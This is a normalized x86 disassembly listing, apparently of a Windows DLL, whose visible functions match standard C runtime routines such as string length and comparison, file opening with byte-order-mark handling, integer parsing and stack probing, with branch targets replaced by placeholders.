mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_10024145
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002a40b
add esp 0x20
pop esi
pop ebp
retn
sub_10079abd
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_10024145
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002a40b
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001ed84
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1004ae8e
pop ebx
leave
retn
sub_10079b60
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_10079bf0
push sub_10042f30
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_10079c49
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_100665e9
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_10079c78
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
dec [ ebp + 0xc ]
push eax
mov eax ebx
call sub_10079c49
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x3f
mov eax ebx
call sub_10079c49
pop ecx
sub_10079ce0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10079d68
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1001399b
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_1002ada5
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_1002ada5
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_100151c1
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_1002ada5
and [ eax ] 0x0
mov [ esi ] ebx
call sub_1004fd6f
mov [ eax ] 0x18
call sub_1004fd6f
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_1005df26
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_1005df26
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_1004fd6f
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_10035e0c
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_1005ed21
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
and [ ebp - 0x28 ] 0x0
push 0x1
lea eax [ ebp - 0x28 ]
push eax
push [ esi ]
call sub_1002f7c4
add esp 0xc
test eax eax
jne r-xdata
call sub_1002ada5
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x34 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileW@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_1005ed21
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1003009f
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_1005df26
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_1003c06a
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_10037763
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_1002f7c4
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_100202ee
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_100202ee
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1003009f
pop ecx
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_1005ed21
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_1002ec01
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_1005ed21
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_100202ee
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_100202ee
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_1007a49d
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_1006b64d
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_1007a4d0
mov edi edi
push ebp
mov ebp esp
push ecx
test [ ebx + 0xc ] 0x40
push esi
mov esi eax
mov eax [ edi ]
mov [ ebp - 0x4 ] eax
je r-xdata
and [ edi ] 0x0
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov al [ eax ]
dec [ ebp + 0xc ]
mov ecx ebx
call sub_1007a49d
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0xc ]
add [ esi ] eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
cmp [ edi ] 0x2a
jne r-xdata
pop esi
leave
retn
cmp [ edi ] 0x0
jne r-xdata
mov ecx ebx
mov al 0x3f
call sub_1007a49d
sub_1007a540
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1007a56b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push 0x8
pop ebx
cmp [ ebp + 0x10 ] 0x2
jl r-xdata
pop edi
leave
retn
movzx esi [ edi ]
push ebx
push esi
add edi 0x2
call sub_10065abd
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp si 0x2d
jne r-xdata
cmp [ ebp + 0x10 ] 0x24
jg r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
movzx esi [ edi ]
add edi 0x2
cmp [ ebp + 0x10 ] 0x10
jne r-xdata
push esi
call sub_1004c82c
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edx
mov ebx eax
push esi
call sub_1004c82c
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x10
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x14 ]
sub edi 0x2
test al 0x8
jne r-xdata
or [ ebp + 0x14 ] 0x8
cmp [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x10 ] ebx
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
imul ecx [ ebp + 0x10 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1004fd6f
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0x8 ]
push esi
call sub_1004c82c
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp + 0x14 ] 0x4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x8 ]
jbe r-xdata
add eax 0xffffffc9
sub eax 0x20
test [ ebp + 0x14 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0xc ]
pop esi
pop ebx
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x4 ]
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
sub_1007a72d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_1006a508
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor ecx ecx
cmp eax ecx
je r-xdata
cmp ebx ecx
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] ecx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push esi
movzx esi [ ebx ]
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x8
push esi
call sub_10065abd
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop ebx
leave
retn
movzx esi [ edi ]
add edi 0x2
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
movzx esi [ edi ]
add edi 0x2
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_1004c82c
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_1007c490
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_1004c82c
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp eax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp eax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
sub edi 0x2
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
movzx esi [ edi + 0x2 ]
add edi 0x4
cmp eax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_1007c530
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_1004fd6f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_1004c82c
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
add edi 0x2
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
pop esi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_1007a9d4
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1007aa03
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_10079a10
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1007aa67
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
